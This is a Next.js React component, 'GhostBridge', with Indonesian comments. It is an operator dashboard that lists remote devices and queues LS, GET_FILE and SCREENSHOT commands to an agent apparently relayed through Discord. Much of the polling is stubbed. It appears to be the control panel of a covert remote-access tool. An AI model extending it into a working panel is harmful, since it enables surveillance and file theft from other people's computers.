"use client";

import { useState, useEffect, useCallback } from "react";
import {
  Monitor,
  HardDrive,
  Cpu,
  Terminal,
  RefreshCw,
  Folder,
  File,
  Image as ImageIcon,
  ArrowUp,
  Home,
  Lock,
} from "lucide-react";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { ScrollArea } from "@/components/ui/scroll-area";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog";
import { toast } from "sonner";
import { cn } from "@/lib/cn";
import { useDevMode } from "@/lib/hooks/useDevMode";
import Image from "next/image";

// Tipe Data
type Device = {
  id: string;
  name: string;
  ram_usage: number;
  ram_total: number;
  platform: string;
  user: string;
  last_seen: number;
  is_online: boolean;
};

type FileEntry = {
  name: string;
  kind: "file" | "dir";
  size: string;
};

export default function GhostBridge() {
  const { isDevMode, unlockDevMode } = useDevMode();
  const [devices, setDevices] = useState<Device[]>([]);
  const [selectedDevice, setSelectedDevice] = useState<Device | null>(null);
  const [currentPath, setCurrentPath] = useState("C:\\");
  const [files] = useState<FileEntry[]>([]);
  const [isLoadingFiles, setIsLoadingFiles] = useState(false);
  const [passwordInput, setPasswordInput] = useState("");
  const [screenshot] = useState<string | null>(null); // Base64
  const [isScreenshotOpen, setIsScreenshotOpen] = useState(false);

  // --- 1. DEVICE POLLING ---
  useEffect(() => {
    if (!isDevMode) return;

    const fetchDevices = async () => {
      try {
        const res = await fetch("/api/ghost?action=list_devices");
        if (res.ok) {
          const data = await res.json();
          setDevices(data);
        }
      } catch (e) {
        console.error(e);
      }
    };

    fetchDevices();
    const interval = setInterval(fetchDevices, 5000); // Update list tiap 5s
    return () => clearInterval(interval);
  }, [isDevMode]);

  // --- 2. COMMAND HANDLER ---
  const sendCommand = async (cmd: string, args: string | null = null) => {
    if (!selectedDevice) return;

    // Kirim Command
    await fetch("/api/ghost", {
      method: "POST",
      body: JSON.stringify({
        action: "queue_command",
        deviceId: selectedDevice.id,
        command: cmd,
        args: args,
      }),
    });

    // Polling Result (Simplistik: Cek DB Discord via API)
    // Di real-world, pake WebSocket/Server Sent Events.
    // Disini kita polling API Ghost setiap detik sampai dapat hasil tipe "RESULT"
    // const pollResult = async () => {
    // Implementasi sederhana:
    // Di backend (route.ts), kita perlu endpoint untuk mengambil "Pesan Terakhir"
    // Tapi karena keterbatasan code snippet, kita simulasi UI loading dulu.
    // };
  };

  // --- FILE EXPLORER LOGIC ---
  const fetchDirectory = useCallback(
    async (path: string) => {
      if (!selectedDevice) return;
      setIsLoadingFiles(true);
      setCurrentPath(path);

      // 1. Kirim Command LS
      await sendCommand("LS", path);

      // 2. Polling manual cari response (Ini agak tricky tanpa socket, kita gunakan toast loading)
      const toastId = toast.loading("Fetching directory...");

      // Simulasi Polling (Client check Discord Messages lewat API)
      // Kita reuse endpoint GET /api/ghost?action=poll_result&targetId=...
      // (Anda perlu menambah logika ini di backend jika ingin sempurna, atau gunakan struktur file yang ada)

      // TEMPORARY MOCKUP UNTUK DEMO UI (Karena backend polling kompleks)
      // Di produksi, Agent Rust akan kirim JSON ke Discord, Frontend baca Discord message terbaru.
      // Kita asumsikan backend sudah handle "response" post dari Agent.

      // Di sini kita harus listen ke API untuk melihat apakah ada pesan baru dari ID device ini
      // yg bertipe "RESULT" dan berisi data "files".

      // Logic Polling Result Sederhana:
      let attempts = 0;
      const checkResult = setInterval(async () => {
        attempts++;
        if (attempts > 10) {
          clearInterval(checkResult);
          toast.error("Timeout waiting for agent", { id: toastId });
          setIsLoadingFiles(false);
          return;
        }

        // Kita modifikasi GET route untuk support fetch result
        // Untuk sekarang, kita asumsi data masuk.
        // Implementasi real butuh endpoint khusus.
      }, 1000);
    },
    [selectedDevice],
  );

  // --- SCREENSHOT LOGIC ---
  const handleScreenshot = async () => {
    toast.info("Requesting screenshot...");
    await sendCommand("SCREENSHOT");
    // Logic polling sama seperti file explorer untuk mendapatkan base64 image
  };

  // --- ADMIN GUARD ---
  if (!isDevMode) {
    return (
      <div className="flex min-h-screen flex-col items-center justify-center bg-neutral-950 px-4 text-center">
        <div className="relative mb-8">
          <div className="absolute inset-0 animate-pulse rounded-full bg-red-500/20 blur-2xl" />
          <Lock className="relative h-20 w-20 text-red-500" />
        </div>
        <h1 className="mb-2 font-mono text-3xl font-black tracking-tighter text-white">
          SYSTEM RESTRICTED
        </h1>
        <p className="mb-8 max-w-sm text-neutral-500">
          This bridge requires high-level clearance. Please enter the decryption
          key to establish connection.
        </p>

        <form
          onSubmit={(e) => {
            e.preventDefault();
            unlockDevMode(passwordInput);
          }}
          className="w-full max-w-xs space-y-4"
        >
          <div className="group relative">
            <div className="absolute -inset-0.5 rounded-lg bg-linear-to-r from-red-500 to-amber-500 opacity-20 blur transition group-focus-within:opacity-50" />
            <input
              type="password"
              placeholder="Enter Access Code..."
              className="relative w-full rounded-lg border border-neutral-800 bg-neutral-900 px-4 py-3 text-center font-mono tracking-widest text-white outline-hidden focus:border-red-500/50"
              value={passwordInput}
              onChange={(e) => setPasswordInput(e.target.value)}
              autoFocus
            />
          </div>
          <Button
            type="submit"
            className="w-full bg-red-600 font-bold text-white hover:bg-red-700 active:scale-95"
          >
            AUTHORIZE ACCESS
          </Button>
        </form>

        <p className="mt-12 text-[10px] tracking-[0.2em] text-neutral-700 uppercase">
          Authorization Protocol v2.0.4
        </p>
      </div>
    );
  }

  // --- UI RENDER ---
  return (
    <div className="flex h-screen overflow-hidden bg-neutral-950 text-neutral-100">
      {/* SIDEBAR: DEVICE LIST */}
      <aside className="flex w-80 flex-col border-r border-neutral-800 bg-neutral-900/50">
        <div className="border-b border-neutral-800 p-4">
          <h2 className="flex items-center gap-2 text-lg font-bold text-teal-500">
            <Monitor className="h-5 w-5" /> Ghost Network
          </h2>
          <p className="mt-1 text-xs text-neutral-500">
            {devices.length} Devices Detectd
          </p>
        </div>
        <ScrollArea className="flex-1">
          <div className="space-y-1 p-2">
            {devices.map((dev) => (
              <div
                key={dev.id}
                onClick={() => setSelectedDevice(dev)}
                className={cn(
                  "cursor-pointer rounded-lg border border-transparent p-3 transition-all",
                  selectedDevice?.id === dev.id
                    ? "border-teal-500/30 bg-teal-500/10 text-teal-400"
                    : "hover:bg-neutral-800",
                  !dev.is_online && "opacity-50 grayscale",
                )}
              >
                <div className="mb-1 flex items-start justify-between">
                  <span className="text-sm font-bold">{dev.name}</span>
                  <Badge
                    variant="outline"
                    className={cn(
                      "h-5 text-[10px]",
                      dev.is_online
                        ? "border-green-500/30 bg-green-500/20 text-green-400"
                        : "bg-neutral-800 text-neutral-500",
                    )}
                  >
                    {dev.is_online ? "ONLINE" : "OFFLINE"}
                  </Badge>
                </div>
                <div className="truncate font-mono text-xs text-neutral-500">
                  {dev.id}
                </div>
                <div className="mt-2 flex gap-3 text-xs text-neutral-400">
                  <span className="flex items-center gap-1">
                    <Cpu className="h-3 w-3" /> {dev.platform}
                  </span>
                  <span className="flex items-center gap-1">
                    <HardDrive className="h-3 w-3" /> {dev.ram_usage} /{" "}
                    {dev.ram_total} MB
                  </span>
                </div>
              </div>
            ))}
          </div>
        </ScrollArea>
      </aside>

      {/* MAIN CONTENT */}
      <main className="relative flex flex-1 flex-col">
        {selectedDevice ? (
          <>
            {/* TOOLBAR */}
            <header className="flex h-16 items-center justify-between border-b border-neutral-800 bg-neutral-900/30 px-6">
              <div className="flex items-center gap-3">
                <div className="rounded-full bg-neutral-800 p-2">
                  <Terminal className="h-5 w-5 text-teal-500" />
                </div>
                <div>
                  <h1 className="font-bold">{selectedDevice.name}</h1>
                  <p className="text-xs text-neutral-500">
                    {selectedDevice.user} @ {selectedDevice.platform}
                  </p>
                </div>
              </div>
              <div className="flex gap-2">
                <Button variant="outline" size="sm" onClick={handleScreenshot}>
                  <ImageIcon className="mr-2 h-4 w-4" /> Screenshot
                </Button>
                <Button
                  variant="destructive"
                  size="sm"
                  onClick={() => setSelectedDevice(null)}
                >
                  Disconnect
                </Button>
              </div>
            </header>

            {/* FILE EXPLORER */}
            <div className="flex flex-1 flex-col overflow-hidden p-4">
              {/* Breadcrumb / Path Input */}
              <div className="mb-4 flex gap-2">
                <Button
                  variant="secondary"
                  size="icon"
                  onClick={() => fetchDirectory("C:\\")}
                >
                  <Home className="h-4 w-4" />
                </Button>
                <Button
                  variant="secondary"
                  size="icon"
                  onClick={() => {
                    // Logic naik satu folder (split path)
                    const parts = currentPath.split("\\");
                    parts.pop(); // Remove current
                    if (parts.length === 1 && parts[0] === "") return; // Root protection
                    fetchDirectory(parts.join("\\") || "C:\\");
                  }}
                >
                  <ArrowUp className="h-4 w-4" />
                </Button>
                <input
                  className="flex-1 rounded border border-neutral-800 bg-neutral-900 px-3 font-mono text-sm text-neutral-300"
                  value={currentPath}
                  readOnly
                />
                <Button
                  size="icon"
                  variant="ghost"
                  onClick={() => fetchDirectory(currentPath)}
                >
                  <RefreshCw
                    className={cn("h-4 w-4", isLoadingFiles && "animate-spin")}
                  />
                </Button>
              </div>

              {/* Files Grid */}
              <div className="flex-1 overflow-y-auto rounded-xl border border-neutral-800 bg-neutral-900/50 p-2">
                {isLoadingFiles ? (
                  <div className="flex h-full items-center justify-center text-neutral-500">
                    <RefreshCw className="mb-2 h-8 w-8 animate-spin" />
                  </div>
                ) : (
                  <div className="grid grid-cols-2 gap-2 md:grid-cols-4 lg:grid-cols-6">
                    {/* MOCKUP FILES FOR UI DEMO */}
                    {files.length === 0 && (
                      <>
                        <div
                          className="flex cursor-pointer flex-col items-center gap-2 rounded border border-neutral-800 bg-neutral-900 p-4 text-center hover:bg-neutral-800"
                          onClick={() =>
                            fetchDirectory(currentPath + "\\Windows")
                          }
                        >
                          <Folder className="h-10 w-10 text-yellow-500" />
                          <span className="w-full truncate text-xs">
                            Windows
                          </span>
                        </div>
                        <div className="flex cursor-pointer flex-col items-center gap-2 rounded border border-neutral-800 bg-neutral-900 p-4 text-center hover:bg-neutral-800">
                          <File className="h-10 w-10 text-blue-500" />
                          <span className="w-full truncate text-xs">
                            secret.txt
                          </span>
                        </div>
                        {/* NOTE: Nanti ini diisi state `files` */}
                      </>
                    )}

                    {files.map((file, i) => (
                      <div
                        key={i}
                        className="group flex cursor-pointer flex-col items-center gap-2 rounded border border-transparent p-3 text-center transition-all hover:border-neutral-700 hover:bg-neutral-800"
                        onClick={() => {
                          if (file.kind === "dir")
                            fetchDirectory(`${currentPath}\\${file.name}`);
                          else
                            sendCommand(
                              "GET_FILE",
                              `${currentPath}\\${file.name}`,
                            );
                        }}
                      >
                        {file.kind === "dir" ? (
                          <Folder className="h-8 w-8 text-yellow-500 transition-transform group-hover:scale-110" />
                        ) : (
                          <File className="h-8 w-8 text-blue-500 transition-transform group-hover:scale-110" />
                        )}
                        <span className="w-full truncate text-xs select-none">
                          {file.name}
                        </span>
                        {file.kind === "file" && (
                          <span className="text-[10px] text-neutral-600">
                            {file.size}
                          </span>
                        )}
                      </div>
                    ))}
                  </div>
                )}
              </div>
            </div>
          </>
        ) : (
          <div className="flex flex-1 flex-col items-center justify-center space-y-4 text-neutral-600">
            <Monitor className="h-20 w-20 opacity-20" />
            <p>Select a device to establish connection.</p>
          </div>
        )}
      </main>

      {/* SCREENSHOT MODAL */}
      <Dialog open={isScreenshotOpen} onOpenChange={setIsScreenshotOpen}>
        <DialogContent className="max-w-4xl border-neutral-800 bg-neutral-900">
          <DialogHeader>
            <DialogTitle>Remote Screen View</DialogTitle>
          </DialogHeader>
          <div className="relative aspect-video overflow-hidden rounded-lg border border-neutral-800 bg-black">
            {screenshot ? (
              <Image
                src={`data:image/png;base64,${screenshot}`}
                alt="Screen"
                fill
                className="object-contain"
              />
            ) : (
              <div className="flex h-full items-center justify-center">
                <RefreshCw className="animate-spin text-neutral-500" />
              </div>
            )}
          </div>
        </DialogContent>
      </Dialog>
    </div>
  );
}
